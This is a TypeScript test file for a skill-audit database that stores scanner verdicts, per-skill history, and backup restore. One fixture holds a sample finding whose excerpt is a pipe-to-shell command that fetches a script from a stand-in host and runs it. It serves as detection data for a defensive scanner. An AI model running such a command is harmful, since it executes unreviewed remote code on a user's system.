import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import type { SkillAuditFinding } from '@runova/core';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { SkillAuditRecord } from '../shared/apiTypes';
import { useTempUserData } from '../test/main/ipcHarness';

/**
 * Skill audit history: the verdict badge a skill card shows without rescanning, the per-skill
 * history list, and the backup export and restore that has to replace the table atomically.
 */

const userData = useTempUserData();

/**
 * Nothing closes these sqlite handles, and Windows will not remove a folder that still holds an
 * open file, so the harness cleanup would throw. Each connection is recorded and closed first.
 */
const openDatabases = new Set<DatabaseSync>();
const nativePrepare = DatabaseSync.prototype.prepare;
const nativeExec = DatabaseSync.prototype.exec;
DatabaseSync.prototype.prepare = function trackedPrepare(this: DatabaseSync, sql: string) {
  openDatabases.add(this);
  return nativePrepare.call(this, sql);
};
DatabaseSync.prototype.exec = function trackedExec(this: DatabaseSync, sql: string) {
  openDatabases.add(this);
  return nativeExec.call(this, sql);
};

function closeOpenDatabases(): void {
  for (const database of openDatabases) {
    try {
      database.close();
    } catch {
      // Already closed.
    }
  }
  openDatabases.clear();
}

afterEach(closeOpenDatabases);

type Db = typeof import('./skillAuditDb')['skillAuditDb'];

async function loadDb(): Promise<Db> {
  return (await import('./skillAuditDb')).skillAuditDb;
}

// A fixed clock, because `add` stamps created_at itself and the ordering is what is under test.
beforeEach(() => {
  vi.useFakeTimers();
  vi.setSystemTime(new Date('2026-03-01T12:00:00.000Z'));
});

function finding(overrides: Partial<SkillAuditFinding> = {}): SkillAuditFinding {
  return {
    ruleId: 'curl-pipe-sh',
    category: 'remote-code-execution',
    severity: 'critical',
    title: 'Pipes a download straight into a shell',
    detail: 'The skill fetches a script and runs it without review.',
    file: 'SKILL.md',
    line: 12,
    excerpt: 'curl example.com/x.sh | sh',
    origin: 'static',
    ...overrides,
  };
}

type NewAudit = Omit<SkillAuditRecord, 'id' | 'createdAt'>;

function audit(overrides: Partial<NewAudit> = {}): NewAudit {
  return {
    skillId: 'skill-a',
    skillName: 'Deploy helper',
    sourceKind: 'repository',
    sourceLabel: 'runova/skills',
    projectId: null,
    verdict: 'risky',
    score: 40,
    findings: [finding()],
    filesScanned: 3,
    bytesScanned: 4096,
    deepReview: false,
    cliName: null,
    aiSummary: null,
    aiError: null,
    ...overrides,
  };
}

/** Adds audits a simulated minute apart so created_at ordering is deterministic. */
function addSpaced(db: Db, count: number, overrides: Partial<NewAudit> = {}): SkillAuditRecord[] {
  return Array.from({ length: count }, (_, index) => {
    vi.setSystemTime(new Date(Date.UTC(2026, 2, 1, 12, index)));
    return db.add(audit({ skillName: `Skill ${index}`, ...overrides }));
  });
}

describe('schema creation', () => {
  it('creates the database on first use and stamps the record', async () => {
    const db = await loadDb();

    const saved = db.add(audit());

    expect(existsSync(join(userData.dir, 'data', 'skill-audits.db'))).toBe(true);
    expect(saved.id).toMatch(/^[0-9a-f-]{36}$/);
    expect(saved.createdAt).toBe('2026-03-01T12:00:00.000Z');
    expect(db.get(saved.id)).toEqual(saved);
  });

  it('keeps the booleans and the JSON column intact through the round trip', async () => {
    const db = await loadDb();

    const saved = db.add(
      audit({ deepReview: true, cliName: 'claude-code', aiSummary: 'Looks risky.' }),
    );

    const read = db.get(saved.id);
    // deep_review is an INTEGER column, so this is the conversion that could quietly invert.
    expect(read?.deepReview).toBe(true);
    expect(read?.findings).toEqual([finding()]);
    expect(read?.cliName).toBe('claude-code');
    expect(read?.aiSummary).toBe('Looks risky.');
    expect(read?.aiError).toBeNull();
  });

  it('reopens a database that already holds audits', async () => {
    const first = await loadDb();
    const saved = first.add(audit());
    closeOpenDatabases();

    vi.resetModules();
    const second = await loadDb();

    expect(second.get(saved.id)?.skillName).toBe('Deploy helper');
  });

  it('returns null for an audit that is not there', async () => {
    const db = await loadDb();

    expect(db.get('missing')).toBeNull();
  });
});

describe('list', () => {
  it('returns the newest audit first', async () => {
    const db = await loadDb();
    addSpaced(db, 3);

    expect(db.list().map((one) => one.skillName)).toEqual(['Skill 2', 'Skill 1', 'Skill 0']);
  });

  it('narrows to one skill history', async () => {
    const db = await loadDb();
    addSpaced(db, 2, { skillId: 'skill-a' });
    addSpaced(db, 1, { skillId: 'skill-b' });

    expect(db.list({ skillId: 'skill-a' })).toHaveLength(2);
    expect(db.list()).toHaveLength(3);
  });

  it('honours the limit on both branches', async () => {
    const db = await loadDb();
    addSpaced(db, 4, { skillId: 'skill-a' });

    expect(db.list({ limit: 2 })).toHaveLength(2);
    expect(db.list({ skillId: 'skill-a', limit: 1 })).toHaveLength(1);
  });

  it('treats an empty skillId as no filter at all', async () => {
    const db = await loadDb();
    addSpaced(db, 2);

    // '' is falsy, so it takes the unfiltered branch rather than matching no rows.
    expect(db.list({ skillId: '' })).toHaveLength(2);
  });
});

describe('latestPerSkill', () => {
  it('keeps one row per skill, the most recent one', async () => {
    const db = await loadDb();
    vi.setSystemTime(new Date('2026-03-01T10:00:00.000Z'));
    db.add(audit({ skillId: 'a', verdict: 'safe', score: 100 }));
    vi.setSystemTime(new Date('2026-03-01T11:00:00.000Z'));
    db.add(audit({ skillId: 'b', verdict: 'caution', score: 70 }));
    vi.setSystemTime(new Date('2026-03-01T12:00:00.000Z'));
    db.add(audit({ skillId: 'a', verdict: 'dangerous', score: 5 }));

    const latest = db.latestPerSkill();

    expect(latest).toHaveLength(2);
    // Newest first overall, and skill a shows its second scan rather than its first.
    expect(latest.map((one) => [one.skillId, one.verdict])).toEqual([
      ['a', 'dangerous'],
      ['b', 'caution'],
    ]);
  });

  it('is empty on a database with no audits yet', async () => {
    const db = await loadDb();

    expect(db.latestPerSkill()).toEqual([]);
  });
});

describe('remove and clear', () => {
  it('deletes one audit and leaves the rest', async () => {
    const db = await loadDb();
    const [first, second] = addSpaced(db, 2);

    db.remove(first.id);

    expect(db.list().map((one) => one.id)).toEqual([second.id]);
  });

  it('empties the whole table', async () => {
    const db = await loadDb();
    addSpaced(db, 3);

    db.clear();

    expect(db.list()).toEqual([]);
    expect(db.latestPerSkill()).toEqual([]);
  });
});

describe('backup export and import', () => {
  it('exports everything, past the cap list() applies', async () => {
    const db = await loadDb();
    addSpaced(db, 5);

    expect(db.list({ limit: 2 })).toHaveLength(2);
    expect(db.exportAll()).toHaveLength(5);
  });

  it('replaces the table with what the backup carried', async () => {
    const db = await loadDb();
    db.add(audit({ skillName: 'will be gone' }));
    const restored: SkillAuditRecord = {
      ...audit({ skillName: 'from the backup', projectId: 'alpha' }),
      id: 'restored-1',
      createdAt: '2026-02-02T00:00:00.000Z',
    };

    db.importAll([restored]);

    expect(db.exportAll()).toEqual([restored]);
  });

  it('rolls the import back when one row cannot be inserted', async () => {
    const db = await loadDb();
    const existing = db.add(audit({ skillName: 'still here afterwards' }));
    const duplicate: SkillAuditRecord = {
      ...audit(),
      id: 'same-id',
      createdAt: '2026-02-02T00:00:00.000Z',
    };

    // Two rows sharing a primary key: the second insert fails inside the transaction.
    expect(() => db.importAll([duplicate, { ...duplicate, skillName: 'second' }])).toThrow();

    // The delete that opened the transaction has to roll back too, or a failed restore would
    // leave the user with an empty history instead of the one they had.
    expect(db.exportAll()).toEqual([existing]);
  });

  it('fills in a findings list the backup left out', async () => {
    const db = await loadDb();
    const partial = {
      ...audit(),
      findings: undefined,
      id: 'no-findings',
      createdAt: '2026-02-02T00:00:00.000Z',
    } as unknown as SkillAuditRecord;

    db.importAll([partial]);

    // The column is NOT NULL, so a missing list has to become empty JSON rather than a crash.
    expect(db.exportAll()[0].findings).toEqual([]);
  });
});
